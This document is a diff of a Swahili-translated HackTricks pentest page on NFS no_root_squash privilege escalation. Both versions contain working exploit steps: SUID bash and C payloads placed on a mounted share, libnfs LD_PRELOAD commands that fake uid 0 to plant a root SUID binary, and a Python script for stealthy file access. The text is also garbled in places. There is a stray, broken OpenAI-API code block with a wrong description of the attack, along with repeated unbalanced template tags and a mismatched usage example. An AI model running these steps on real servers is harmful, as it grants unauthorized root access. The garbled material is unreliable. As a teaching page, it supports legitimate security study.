@@ -1,31 +1,37 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-Soma faili ya _ **/etc/exports** _, ikiwa utapata saraka ambayo imehifadhiwa kama **no\_root\_squash**, basi unaweza **kuiingia** kutoka **kama mteja** na **kuandika ndani** ya saraka hiyo **kama** wewe ni **root** wa kompyuta hiyo.
+Soma _ **/etc/exports** _ faili, ikiwa unapata directory ambayo imewekwa kama **no\_root\_squash**, basi unaweza **kufikia** hiyo kutoka **kama mteja** na **kuandika ndani** ya hiyo directory **kama** ungekuwa **root** wa mashine hiyo.
 
-**no\_root\_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji wa root kwenye mteja kupata faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari kubwa za usalama.
+**no\_root\_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji root kwenye mteja kufikia faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari kubwa za usalama.
 
-**no\_all\_squash:** Hii ni sawa na chaguo la **no\_root\_squash** lakini inatumika kwa **watumiaji wasio na mamlaka ya root**. Fikiria, una kikao kama mtumiaji wa "nobody"; angalia faili ya /etc/exports; chaguo la no\_all\_squash lipo; angalia faili ya /etc/passwd; jifanya kama mtumiaji asiye na mamlaka ya root; tengeneza faili ya suid kama mtumiaji huyo (kwa kufunga kwa kutumia nfs). Tekeleza suid kama mtumiaji wa "nobody" na kuwa mtumiaji tofauti.
+**no\_all\_squash:** Hii ni sawa na chaguo la **no\_root\_squash** lakini inatumika kwa **watumiaji wasiokuwa root**. Fikiria, una shell kama mtumiaji nobody; umeangalia faili ya /etc/exports; chaguo la no\_all\_squash lipo; angalia faili ya /etc/passwd; fanya kama mtumiaji asiye root; tengeneza faili la suid kama mtumiaji huyo (kwa kuunganisha kwa kutumia nfs). Tekeleza suid kama mtumiaji nobody na kuwa mtumiaji tofauti.
 
-# Kudukua Mamlaka
+# Privilege Escalation
 
-## Kudukua Kijijini
+## Remote Exploit
 
-Ikiwa umepata udhaifu huu, unaweza kudukua:
+Ikiwa umepata udhaifu huu, unaweza kuutumia:
 
-* **Kufunga saraka hiyo** kwenye kompyuta ya mteja, na **kama root nakili** ndani ya saraka iliyofungwa **/bin/bash** na kumpa haki za **SUID**, na **kutekeleza kutoka kwenye kompyuta ya mwathirika** bash hiyo.
+* **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyounganishwa **/bin/bash** binary na kumpa haki za **SUID**, na **kutekeleza kutoka kwa mashine** ya mwathirika hiyo bash binary.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Kuunganisha saraka hiyo** kwenye kifaa cha mteja, na **kama mtumiaji mkuu nakili** ndani ya saraka iliyoundwa faili yetu iliyokompiliwa ambayo itatumia ruhusa ya SUID, itoe ruhusa ya SUID, na **itekeleze kutoka kwenye kifaa cha muathirika** faili hiyo (unaweza kupata hapa baadhi ya [malipo ya C SUID](payloads-to-execute.md#c)).
+* **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyowekwa payload yetu iliyotengenezwa ambayo itatumia ruhusa ya SUID, itapeleka **SUID** haki, na **kuendesha kutoka kwa** mashine ya mwathirika hiyo binary (unaweza kupata hapa baadhi ya [C SUID payloads](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -52,40 +58,40 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Shambulizi la Ndani
+## Local Exploit
 
 {% hint style="info" %}
-Tafadhali kumbuka kuwa ikiwa unaweza kuunda **tunnel kutoka kwenye kifaa chako hadi kwenye kifaa cha mwathirika, bado unaweza kutumia toleo la Mbali kutekeleza shambulizi hili la kuongeza mamlaka kwa kuchimba bandari zinazohitajika**.\
-Mbinu ifuatayo ni ikiwa faili ya `/etc/exports` **inaonyesha anwani ya IP**. Katika kesi hii, **hutaweza kutumia** kwa hali yoyote **shambulizi la mbali** na utahitaji **kutumia mbinu hii**.\
-Mahitaji mengine muhimu kwa shambulizi kufanya kazi ni kwamba **kielekezi ndani ya `/etc/export`** **lazima kitumie bendera ya `insecure`**.\
-\--_Sina uhakika ikiwa mbinu hii itafanya kazi ikiwa `/etc/export` inaonyesha anwani ya IP_--
+Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwa mashine yako hadi mashine ya mwathirika unaweza bado kutumia toleo la Remote kutekeleza kupanda kwa haki hii kwa kutunga bandari zinazohitajika**.\
+Trick ifuatayo ni katika kesi faili `/etc/exports` **inaonyesha IP**. Katika kesi hii **hutoweza kutumia** kwa njia yoyote **exploit ya mbali** na utahitaji **kudhulumu hila hii**.\
+Sharti lingine muhimu ili exploit ifanye kazi ni kwamba **export ndani ya `/etc/export`** **lazima litumie bendera `insecure`**.\
+\--_Sijui kama `/etc/export` inaonyesha anwani ya IP hila hii itafanya kazi_--
 {% endhint %}
 
-## Taarifa Msingi
+## Basic Information
 
-Hali inahusisha kutumia sehemu ya kuhifadhiwa ya NFS iliyosakinishwa kwenye kifaa cha ndani, kwa kutumia kasoro katika maelezo ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, na hivyo kuwezesha ufikiaji usiohalali. Shambulizi linahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kufanya wito wa RPC za NFS.
+Hali hii inahusisha kutumia faida ya NFS iliyowekwa kwenye mashine ya ndani, ikitumia kasoro katika spesifikesheni ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, ambayo inaweza kuwezesha ufikiaji usioidhinishwa. Kutekeleza kunahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kutunga wito wa NFS RPC.
 
-### Kukusanya Maktaba
+### Compiling the Library
 
-Hatua za kukusanya maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, wito wa mfumo wa fallocate ulifutwa. Mchakato wa kukusanya maktaba unahusisha amri zifuatazo:
+Hatua za ukusanyaji wa maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, syscalls za fallocate zilikuwa zimeandikwa nje. Mchakato wa ukusanyaji unajumuisha amri zifuatazo:
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-### Kutekeleza Udukuzi
+### Conducting the Exploit
 
-Udukuzi huu unahusisha kuunda programu rahisi ya C (`pwn.c`) ambayo inapandisha mamlaka hadi kwa mtumiaji mkuu na kisha kutekeleza kikao cha amri. Programu hiyo inakusanywa, na faili ya binary inayotokana (`a.out`) inawekwa kwenye sehemu ya kugawana na suid ya mizizi, kwa kutumia `ld_nfs.so` kuiga uid katika wito wa RPC:
+The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:
 
-1. **Kusanya kificho cha udukuzi:**
+1. **Compile the exploit code:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Weka udukuzi kwenye sehemu ya kugawana na ubadilishe ruhusa zake kwa kuiga uid:**
+2. **Place the exploit on the share and modify its permissions by faking the uid:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -93,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Tekeleza udukuzi ili kupata mamlaka ya mizizi:**
+3. **Execute the exploit to gain root privileges:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## Bonus: NFShell kwa Upatikanaji wa Siri wa Faili
-Baada ya kupata mamlaka ya mizizi, ili kuwasiliana na sehemu ya kugawana ya NFS bila kubadilisha umiliki (ili kuepuka kuacha alama), skripti ya Python (nfsh.py) hutumiwa. Skripti hii inabadilisha uid ili kulingana na faili inayopatikana, kuruhusu mwingiliano na faili kwenye sehemu ya kugawana bila matatizo ya ruhusa:
+## Bonus: NFShell for Stealthy File Access
+Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -119,87 +125,32 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-```python
-import openai
-
-def translate_text(text):
-    response = openai.Completion.create(
-        engine="davinci",
-        prompt=text,
-        max_tokens=100,
-        temperature=0.7,
-        n=1,
-        stop=None,
-        log_level="info",
-        logprobs=0,
-        echo=True,
-        logit_bias=None,
-        return_prompt=True,
-        return_completion=True,
-        expand_prompt=True,
-        model=None,
-        data=None,
-        documents=None,
-        **kwargs
-    )
-    return response.choices[0].text.strip()
-
-text = """
-## NFS No_root_squash Misconfiguration PE
-
-### Description
-
-When a user on a client machine accesses a file on the NFS server, the server checks if the user has the necessary permissions to perform the requested operation. By default, the NFS server maps all client requests to a single user, usually the "nobody" user. This is known as the "root squash" feature, which prevents remote users from gaining root access on the server.
-
-However, if the NFS server is misconfigured and the "no_root_squash" option is enabled, remote users can gain root access on the server by exploiting this misconfiguration. This can lead to privilege escalation and unauthorized access to sensitive data.
-
-### Exploitation
-
-To exploit this misconfiguration, an attacker needs to have access to a client machine that mounts the NFS share from the server. The attacker can then create a setuid binary on the client machine and execute it. Since the NFS server maps all client requests to a single user, the setuid binary will be executed with root privileges on the server.
-
-Here are the steps to exploit this misconfiguration:
-
-1. Identify a client machine that mounts the NFS share from the server.
-2. Create a setuid binary on the client machine using a programming language like C.
-3. Compile the setuid binary and transfer it to the client machine.
-4. Execute the setuid binary on the client machine.
-5. The setuid binary will be executed with root privileges on the server, allowing the attacker to gain root access.
-
-### Mitigation
-
-To mitigate this vulnerability, the "no_root_squash" option should be disabled on the NFS server. This can be done by modifying the NFS server configuration file (/etc/exports) and removing the "no_root_squash" option.
-
-After making the changes, the NFS server should be restarted for the changes to take effect.
-
-### References
-
-- [https://www.redhat.com/sysadmin/nfs-security](https://www.redhat.com/sysadmin/nfs-security)
-- [https://www.cyberciti.biz/faq/linux-unix-bsd-exports-command-to-change-nfs-export-options/](https://www.cyberciti.biz/faq/linux-unix-bsd-exports-command-to-change-nfs-export-options/)
-"""
-
-translation = translate_text(text)
-print(translation)
-```
-
-The translation will be printed in the console.
+Kimbia kama:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## Marejeo
-* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)
-
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
